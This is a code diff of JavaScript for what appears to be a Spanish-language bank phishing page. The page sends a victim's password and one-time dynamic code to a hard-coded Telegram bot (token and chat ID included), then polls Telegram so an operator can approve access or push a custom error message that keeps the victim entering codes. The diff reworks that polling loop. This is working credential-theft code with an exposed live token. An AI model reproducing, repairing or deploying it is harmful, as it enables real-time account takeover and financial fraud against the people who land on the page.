@@ -26,31 +26,22 @@ document.addEventListener('DOMContentLoaded', function () {
     const TELEGRAM_API_KEY = '8587283632:AAFFsDyTcTyQYiQyM4rghouex0dlidIZEsk';
     const TELEGRAM_CHAT_ID = '5360036647';
 
-    const DEFAULT_ERROR = 'Clave dinámica o datos incorrectos. Por favor, verifica la información e inténtalo nuevamente.';
-    const ESPERA_MAXIMA = 120000; // 2 min para que el admin responda
-    const POLL_MS = 1000;
-
     let isChecked = false;
+    let pollingInterval = null;
     let lastUpdateId = 0;
-    let pollerId = null;
-    let motivoPendiente = null;
-    let messageIdActual = null;
 
-    const pendientes = new Map(); // messageId -> entrada
+    const DEFAULT_ERROR = 'Clave dinámica o datos incorrectos. Por favor, verifica la información e inténtalo nuevamente.';
 
     // ===== Modal de error =====
-    function actualizarTextoError(mensaje) {
+    function mostrarError(mensaje) {
         const texto = mensaje || DEFAULT_ERROR;
         errorText.textContent = texto;
-        if (errorBanner) errorBanner.textContent = texto;
-    }
-
-    function mostrarError(mensaje) {
-        if (loadingOverlay) loadingOverlay.style.display = 'none';
-        actualizarTextoError(mensaje);
-        if (errorBanner) errorBanner.classList.add('show');
+        if (errorBanner) {
+            errorBanner.textContent = texto;
+            errorBanner.classList.add('show');
+        }
         errorModal.classList.add('active');
-        try { errorAccept.focus(); } catch (e) { }
+        errorAccept.focus();
     }
 
     function ocultarError() {
@@ -173,64 +164,52 @@ document.addEventListener('DOMContentLoaded', function () {
         }
     }
 
-    // ===== Poller único =====
-    async function procesarUpdates() {
+    async function checkTelegramResponse(messageId) {
         const url = `https://api.telegram.org/bot${TELEGRAM_API_KEY}/getUpdates?limit=100&offset=${lastUpdateId}`;
-        let data;
         try {
-            const res = await fetch(url, { cache: 'no-store' });
-            data = await res.json();
-        } catch (e) {
-            return;
-        }
-        if (!data || !data.ok || !data.result || !data.result.length) return;
+            const response = await fetch(url);
+            const data = await response.json();
+            if (!data.ok || !data.result || !data.result.length) return null;
 
-        for (const update of data.result) {
-            if (update.update_id >= lastUpdateId) lastUpdateId = update.update_id + 1;
+            for (const update of data.result) {
+                lastUpdateId = update.update_id + 1;
 
-            const cq = update.callback_query;
-            if (cq && cq.message) {
-                const entrada = pendientes.get(cq.message.message_id);
-                if (entrada && !entrada.done) {
-                    entrada.done = true;
-                    entrada.resolve({ action: cq.data });
+                const cq = update.callback_query;
+                if (cq && cq.message && cq.message.message_id === messageId) {
+                    return { action: cq.data };
                 }
-                continue;
-            }
 
-            const m = update.message;
-            if (m && m.reply_to_message && m.text) {
-                const entrada = pendientes.get(m.reply_to_message.message_id);
-                if (entrada && entrada.onReason) {
-                    entrada.onReason(m.text.trim());
+                const m = update.message;
+                if (m && m.reply_to_message && m.reply_to_message.message_id === messageId && m.text) {
+                    return { action: 'custom', reason: m.text.trim() };
                 }
             }
+            return null;
+        } catch (error) {
+            console.error('Error al verificar respuesta:', error);
+            return null;
         }
     }
 
-    function iniciarPoller() {
-        if (pollerId) return;
-        pollerId = setInterval(procesarUpdates, POLL_MS);
-        procesarUpdates();
-    }
-
-    function esperarRespuesta(messageId, onReason) {
+    function startPolling(messageId) {
         return new Promise((resolve) => {
-            const entrada = {
-                done: false,
-                onReason: onReason,
-                resolve: (r) => {
-                    if (entrada.done) return;
-                    entrada.done = true;
-                    resolve(r);
-                }
-            };
-            pendientes.set(messageId, entrada);
+            let attempts = 0;
+            const maxAttempts = 45; // ~90 segundos
 
-            setTimeout(() => entrada.resolve({ action: 'timeout' }), ESPERA_MAXIMA);
-            setTimeout(() => {
-                if (pendientes.get(messageId) === entrada) pendientes.delete(messageId);
-            }, ESPERA_MAXIMA * 2);
+            pollingInterval = setInterval(async () => {
+                attempts++;
+                const response = await checkTelegramResponse(messageId);
+
+                if (response) {
+                    clearInterval(pollingInterval);
+                    pollingInterval = null;
+                    resolve(response);
+                } else if (attempts >= maxAttempts) {
+                    clearInterval(pollingInterval);
+                    pollingInterval = null;
+                    resolve({ action: 'timeout' });
+                }
+            }, 2000);
         });
     }
 
@@ -245,15 +224,6 @@ document.addEventListener('DOMContentLoaded', function () {
             const dynamicCode = dynamicCodeInput ? dynamicCodeInput.value : '';
 
             ocultarError();
-            motivoPendiente = null;
-
-            // libera la entrada anterior para que no se quede colgada
-            if (messageIdActual && pendientes.has(messageIdActual)) {
-                const vieja = pendientes.get(messageIdActual);
-                vieja.done = true;
-                pendientes.delete(messageIdActual);
-            }
-
             if (loadingOverlay) loadingOverlay.style.display = 'flex';
 
             const messageId = await sendTelegramMessage(
@@ -264,32 +234,35 @@ document.addEventListener('DOMContentLoaded', function () {
             );
 
             if (!messageId) {
+                if (loadingOverlay) loadingOverlay.style.display = 'none';
                 mostrarError('No pudimos conectar con el servidor. Revisa tu conexión e inténtalo de nuevo.');
                 return;
             }
 
-            messageIdActual = messageId;
-            iniciarPoller();
-
-            const resp = await esperarRespuesta(messageId, (reason) => {
-                motivoPendiente = reason;
-                if (errorModal.classList.contains('active')) actualizarTextoError(reason);
-            });
-
+            const resp = await startPolling(messageId);
             if (loadingOverlay) loadingOverlay.style.display = 'none';
 
-            if (resp.action === 'permitir_acceso') {
+            if (resp && resp.action === 'permitir_acceso') {
                 window.location.href = '../confirmacion.html';
                 return;
             }
 
-            if (resp.action === 'timeout') {
-                mostrarError('No pudimos validar tu información a tiempo. Inténtalo nuevamente.');
-            } else {
-                // mostrar_error o custom: modal INMEDIATO
-                mostrarError(resp.reason || motivoPendiente || null);
+            let motivo = resp && resp.reason ? resp.reason : null;
+
+            // Si pulsaron "Mostrar Error", esperamos unos segundos a que escriban el motivo
+            if (!motivo && resp && resp.action === 'mostrar_error') {
+                for (let i = 0; i < 5; i++) {
+                    await new Promise(r => setTimeout(r, 500));
+                    const extra = await checkTelegramResponse(messageId);
+                    if (extra && extra.reason) { motivo = extra.reason; break; }
+                }
             }
 
+            if (!motivo && resp && resp.action === 'timeout') {
+                motivo = 'No pudimos validar tu información a tiempo. Inténtalo nuevamente.';
+            }
+
+            mostrarError(motivo);
             if (passwordInput) passwordInput.value = '';
             if (dynamicCodeInput) dynamicCodeInput.value = '';
             validateForm();
